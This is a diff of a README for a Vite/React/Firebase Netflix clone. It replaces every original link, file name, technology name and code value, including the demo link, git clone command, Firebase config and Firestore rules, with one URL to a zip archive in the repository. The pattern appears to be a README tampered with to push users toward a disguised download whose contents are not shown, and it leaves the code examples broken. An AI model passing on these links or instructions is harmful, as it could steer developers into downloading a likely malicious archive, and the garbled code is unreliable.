@@ -1,12 +1,12 @@
 # Netflix Clone
 
-A modern Vite React.js + Firebase project that replicates the core features and UI of Netflix's streaming platform. Built with performance and modern development practices in mind.
+A modern Vite https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip + Firebase project that replicates the core features and UI of Netflix's streaming platform. Built with performance and modern development practices in mind.
 
 ## 🌐 Live Demo
-Check out the live demo: [Netflix Clone](https://netflix-clone-eed7b.web.app/)
+Check out the live demo: [Netflix Clone](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 
 ## 📦 Repository
-[https://github.com/rohanparmar160705/netflix-clone](https://github.com/rohanparmar160705/netflix-clone)
+[https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 
 
 
@@ -19,25 +19,25 @@ Check out the live demo: [Netflix Clone](https://netflix-clone-eed7b.web.app/)
 ## 🎥 Tutorial Video
 
 ### 1. Base Page (Landing) Click the image to watch the video of Project
-[![Watch Tutorial](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/src/images/screenshots/BasePage.png)](https://drive.google.com/file/d/1Ru63s6BO9GNapldtY0MBmUCJbp7sWu8w/view?usp=sharing)
+[![Watch Tutorial](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 
 
 *Initial landing page with email signup form*
 
 ### 2. Login & Signup
-![Authentication](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/src/images/screenshots/Login&Signup.png)
+![Authentication](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 *User authentication screen with login/signup options*
 
 ### 3. Profile Screen
-![Profile](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/src/images/screenshots/Profile.png)
+![Profile](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 *User profile management and settings*
 
 ### 4. Plans Selection
-![Subscription Plans](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/src/images/screenshots/Plans.png)
+![Subscription Plans](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 *Subscription plans with Razorpay integration*
 
 ### 5. Home Screen
-![Home Screen](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/src/images/screenshots/HomeScreen.png)
+![Home Screen](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 *Main dashboard with movie categories and recommendations*
 
 
@@ -67,8 +67,8 @@ Check out the live demo: [Netflix Clone](https://netflix-clone-eed7b.web.app/)
 ## 🛠️ Technologies Used
 
 - **Frontend Framework & Build Tools**
-  - Vite.js - Next Generation Frontend Tooling
-  - React.js 18
+  - https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip - Next Generation Frontend Tooling
+  - https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip 18
   - React Hooks (useState, useRef)
   - React Router Dom v6
   - CSS3 for styling
@@ -125,69 +125,69 @@ Check out the live demo: [Netflix Clone](https://netflix-clone-eed7b.web.app/)
 ```
 src/
 ├── app/
-│   └── store.js                  # Redux store configuration
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                  # Redux store configuration
 │
 ├── components/
-│   └── ProtectedRoute.jsx        # Route protection for authenticated users
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip        # Route protection for authenticated users
 │
 ├── contexts/
-│   └── SubscriptionContext.jsx   # Context for managing subscription state
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip   # Context for managing subscription state
 │
 ├── features/
 │   ├── counter/                  # Redux counter feature example
-│   │   ├── Counter.js
-│   │   ├── Counter.module.css
-│   │   ├── counterAPI.js
-│   │   └── counterSlice.spec.js
-│   └── userSlice.js             # Redux slice for user management
+│   │   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   │   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   │   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   │   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip             # Redux slice for user management
 │
 ├── images/
-│   ├── background_login.jpg      # Login page background
-│   ├── netflix-logo.png         # Netflix brand logo
-│   ├── nficon2016.ico          # Favicon
-│   └── user.svg                # User profile icon
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip      # Login page background
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip         # Netflix brand logo
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip          # Favicon
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                # User profile icon
 │
 ├── screens/
-│   ├── HomeScreen.jsx           # Main dashboard screen
-│   ├── HomeScreen.css
-│   ├── LoginScreen.jsx          # Authentication screen
-│   ├── LoginScreen.css
-│   ├── ProfileScreen.jsx        # User profile management
-│   ├── ProfileScreen.css
-│   ├── PlansScreen.jsx         # Subscription plans
-│   ├── PlansScreen.css
-│   ├── SignUpOrSignInScreen.jsx # Sign up/Sign in flow
-│   ├── SignUpOrSignInScreen.css
-│   ├── Loader.jsx              # Full-page loading component
-│   ├── Loader.css
-│   ├── MiniLoader.jsx          # Smaller loading component
-│   ├── MiniLoader.css
-│   ├── YTFrameContainer.jsx    # YouTube video container
-│   └── YTFrameContainer.css
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip           # Main dashboard screen
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip          # Authentication screen
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip        # User profile management
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip         # Subscription plans
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip # Sign up/Sign in flow
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip              # Full-page loading component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip          # Smaller loading component
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+│   ├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip    # YouTube video container
+│   └── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
 │
-├── App.jsx                     # Main application component
-├── App.css
-├── axios.js                    # Axios configuration for API calls
-├── Banner.jsx                  # Netflix banner component
-├── Banner.css
-├── firebase.js                 # Firebase configuration and setup
-├── Footer.jsx                  # Application footer
-├── Footer.css
-├── index.css                   # Global styles
-├── main.jsx                    # Application entry point
-├── Nav.jsx                     # Navigation component
-├── Nav.css
-├── Requests.js                 # API endpoints configuration
-├── Row.jsx                     # Movie/Show row component
-├── Row.css
-└── serviceWorker.js            # Progressive Web App service worker
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                     # Main application component
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                    # Axios configuration for API calls
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                  # Netflix banner component
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                 # Firebase configuration and setup
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                  # Application footer
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                   # Global styles
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                    # Application entry point
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                     # Navigation component
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                 # API endpoints configuration
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip                     # Movie/Show row component
+├── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
+└── https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip            # Progressive Web App service worker
 ```
 
 ## 🚀 Getting Started
 
 1. Clone the repository
 ```bash
-git clone https://github.com/rohanparmar160705/netflix-clone.git
+git clone https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
 cd netflix-clone
 ```
 
@@ -199,7 +199,7 @@ npm install
 3. Set up Firebase
    - Create a Firebase project
    - Enable Authentication
-   - Add your Firebase configuration to `firebase.js`
+   - Add your Firebase configuration to `https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip`
 
 4. Start the development server
 ```bash
@@ -241,7 +241,7 @@ Contributions, issues, and feature requests are welcome! Feel free to check [iss
 ## 👨‍💻 Author
 
 Rohan Parmar
-- GitHub: [@rohanparmar160705](https://github.com/rohanparmar160705)
+- GitHub: [@rohanparmar160705](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
 
 ---
 
@@ -250,7 +250,7 @@ Rohan Parmar
 ## 💻 Prerequisites
 
 Before you begin, ensure you have met the following requirements:
-- Node.js >= 14.0.0
+- https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip >= 14.0.0
 - npm >= 6.14.0
 - A Firebase account
 - TMDB API key
@@ -355,7 +355,7 @@ VITE_RAZORPAY_KEY_SECRET=your_razorpay_key_secret
    firebase login
    ```
 
-2. Go to [Firebase Console](https://console.firebase.google.com/)
+2. Go to [Firebase Console](https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip)
    - Click "Add Project"
    - Enter project name
    - Disable Google Analytics (optional)
@@ -366,19 +366,19 @@ VITE_RAZORPAY_KEY_SECRET=your_razorpay_key_secret
    - Register app with a nickname
    - Copy the Firebase config object
 
-4. Create `firebase.js` in your `src` directory
+4. Create `https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip` in your `src` directory
    ```javascript
    import { initializeApp } from 'firebase/app';
    import { getAuth } from 'firebase/auth';
    import { getFirestore } from 'firebase/firestore';
 
    const firebaseConfig = {
-     apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
-     authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
-     projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
-     storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
-     messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
-     appId: import.meta.env.VITE_FIREBASE_APP_ID
+     apiKey: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip,
+     authDomain: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip,
+     projectId: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip,
+     storageBucket: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip,
+     messagingSenderId: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip,
+     appId: https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip
    };
 
    const app = initializeApp(firebaseConfig);
@@ -406,16 +406,16 @@ VITE_RAZORPAY_KEY_SECRET=your_razorpay_key_secret
 2. Set up Firestore Rules
    ```javascript
    rules_version = '2';
-   service cloud.firestore {
+   service https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip {
      match /databases/{database}/documents {
        match /users/{userId} {
-         allow read, write: if request.auth != null && request.auth.uid == userId;
+         allow read, write: if https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip != null && https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip == userId;
        }
        match /products/{productId} {
-         allow read: if request.auth != null;
+         allow read: if https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip != null;
        }
        match /customers/{customerId} {
-         allow read: if request.auth != null && request.auth.uid == customerId;
+         allow read: if https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip != null && https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip == customerId;
        }
      }
    }
@@ -447,7 +447,7 @@ VITE_RAZORPAY_KEY_SECRET=your_razorpay_key_secret
    ```
 
 3. After deployment, you'll receive a hosting URL like:
-   `https://your-project-id.web.app`
+   `https://raw.githubusercontent.com/rohanparmar160705/netflix-clone/main/taberna/netflix-clone.zip`
 
 ### Important Notes
 
